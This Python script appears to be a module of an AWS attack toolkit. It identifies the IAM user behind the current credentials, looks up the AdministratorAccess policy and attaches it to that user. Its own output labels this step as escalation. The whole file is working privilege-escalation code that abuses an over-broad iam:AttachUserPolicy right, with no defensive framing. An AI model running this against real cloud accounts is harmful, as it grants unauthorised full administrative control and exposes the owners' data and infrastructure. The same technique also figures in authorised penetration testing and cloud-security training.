import boto3
from botocore.exceptions import ClientError, NoCredentialsError
from session import get_session
from whoami import whoami


# Initialize IAM client
def find_policy_arn(session, policy_name):
    iam = session.client('iam')
    paginator = iam.get_paginator('list_policies')
    try:
        for page in paginator.paginate(Scope='All'):
            for policy in page['Policies']:
                if policy['PolicyName'] == policy_name:
                    return policy['Arn']
        
        return None
    except ClientError as e:
        print(f"[-] ClientError while listing policies: {e}")


def extract_user_from_arn(arn):
    """
    Extracts IAM username from ARN, handling paths correctly.
    Example:
    arn:aws:iam::123:user/test/test-user-01 → test-user-01
    """
    if ":user/" not in arn:
        return None

    user_part = arn.split(":user/")[1]
    return user_part.split("/")[-1]


def attach_admin_policy_to_user(session, user_name):
    iam = session.client('iam')
    admin_policy_arn = find_policy_arn(session, 'AdministratorAccess')

    if not admin_policy_arn:
        print("[-] AdministratorAccess policy not found.")
        return

    try:
        iam.attach_user_policy(
            UserName=user_name,
            PolicyArn=admin_policy_arn
        )
        print(f"[+] AdministratorAccess policy attached to {user_name}.")
    except ClientError as e:
        print(f"[-] Attach Failed: {e}")

def main():
    try:
        session = get_session()
        identity = whoami()

        if "Error" in identity:
            print(f"[-] {identity['Error']}")
            return

        user_arn = identity['Arn']
        user_name = extract_user_from_arn(user_arn)

        if not user_name:
            print("[-] Identity is not an IAM user. Escalation path invalid.")
            return

        print(f"[+] Escalating IAM User: {user_name}")
        attach_admin_policy_to_user(session, user_name)

    except NoCredentialsError:
        print("[-] No credentials provided.")
    except ClientError as e:
        print(f"[-] ClientError: {e}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    main()


